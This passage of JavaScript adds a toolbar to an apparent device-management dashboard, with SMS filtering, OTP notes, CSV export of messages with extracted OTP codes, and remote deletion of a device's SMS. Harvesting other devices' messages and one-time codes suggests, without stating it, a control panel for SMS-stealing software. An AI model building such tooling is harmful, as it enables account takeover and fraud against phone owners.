      host.querySelector('#gru-note-disp').classList.toggle('empty', !v);
      toast('Note saved');
    };
    host.querySelector('#gru-otp-save').onclick = function () {
      var v = host.querySelector('#gru-otp-inp').value.trim();
      setOtpNote(devId, v);
      host.querySelector('#gru-otp-disp').textContent = v || 'No OTP note…';
      host.querySelector('#gru-otp-disp').classList.toggle('empty', !v);
      toast('OTP note saved');
    };
  };

  window.gruEnhanceSmsToolbar = function (host, devId, sms, rerender) {
    if (host.querySelector('#gru-sms-toolbar')) return;
    var head = host.querySelector('.gru-allsms-head');
    if (!head) return;
    var bar = document.createElement('div');
    bar.id = 'gru-sms-toolbar';
    bar.className = 'gru-adv-toolbar-row';
    bar.innerHTML =
      '<button type="button" class="gru-adv-mini" data-sf="all">All</button>' +
      '<button type="button" class="gru-adv-mini" data-sf="in">In</button>' +
      '<button type="button" class="gru-adv-mini" data-sf="out">Out</button>' +
      '<button type="button" class="gru-adv-mini gru-dlt-btn" data-sf="dlt" title="Transactional / DLT alerts">DLT</button>' +
      '<button type="button" class="gru-adv-mini" id="gru-sms-csv">⬇ CSV</button>' +
      '<button type="button" class="gru-adv-mini" id="gru-sms-raw">🔍 Raw</button>' +
      '<button type="button" class="gru-adv-mini danger" id="gru-sms-delall">🗑 Delete All</button>';
    head.after(bar);
    var smsFilter = lastSmsFilter;
    var rawOn = false;
    function applyFilter() {
      host.querySelectorAll('#gru-all-list .gru-sms-item, .gru-sms-item').forEach(function (el) {
        if (rawOn) return;
        var out = el.classList.contains('gru-sms-out');
        var idx = Number(el.getAttribute('data-msg-idx'));
        var dlt = el.getAttribute('data-dlt') === '1' || isDltMsg(sms[idx]);
        var show = smsFilter === 'all' ? true : smsFilter === 'out' ? out : smsFilter === 'in' ? !out : dlt;
        var q = (host.querySelector('#gru-sms-q') || {}).value || '';
        if (show && q) show = el.textContent.toLowerCase().indexOf(q.toLowerCase()) >= 0;
        el.style.display = show ? '' : 'none';
      });
    }
    function markActive() {
      bar.querySelectorAll('[data-sf]').forEach(function (b) {
        var key = b.getAttribute('data-sf');
        b.classList.toggle('on', key === smsFilter);
      });
    }
    bar.querySelectorAll('[data-sf]').forEach(function (btn) {
      btn.onclick = function () {
        smsFilter = btn.getAttribute('data-sf');
        lastSmsFilter = smsFilter;
        markActive();
        applyFilter();
      };
    });
    if (['all', 'in', 'out', 'dlt'].indexOf(smsFilter) < 0) smsFilter = 'all';
    markActive();
    applyFilter();
    bar.querySelector('#gru-sms-csv').onclick = function () {
      var lines = ['from,to,type,time,text,otp'];
      sms.forEach(function (m) {
        lines.push([csvEscape(m.from), csvEscape(m.to), csvEscape(m.sent ? 'out' : 'in'),
          csvEscape(fmtDt(m.time)), csvEscape(m.text), csvEscape(m.otp || '')].join(','));
      });
      downloadCsv('device_' + devId + '_sms.csv', lines);
      toast('CSV downloaded');
    };
    bar.querySelector('#gru-sms-raw').onclick = function () {
      rawOn = !rawOn;
      var list = host.querySelector('#gru-all-list');
      if (!list) return;
      if (rawOn) {
        list.innerHTML = '<pre class="gru-raw-pre">' + esc(JSON.stringify(sms, null, 2)) + '</pre>';
      } else {
        rerender();
      }
    };
    bar.querySelector('#gru-sms-delall').onclick = function () {
      if (!confirm('Delete ALL messages for this device?')) return;
      api('/api/devices/' + encodeURIComponent(devId) + '/sms/delete-all', {}).then(function (res) {
        toast(res.ok ? 'All SMS deleted' : (res.error || 'Failed'));
        if (res.ok) rerender();
      });
    };
    var q = host.querySelector('#gru-sms-q');
    if (q) q.addEventListener('input', applyFilter);
  };

  setInterval(injectToolbar, 1000);
  injectToolbar();
})();
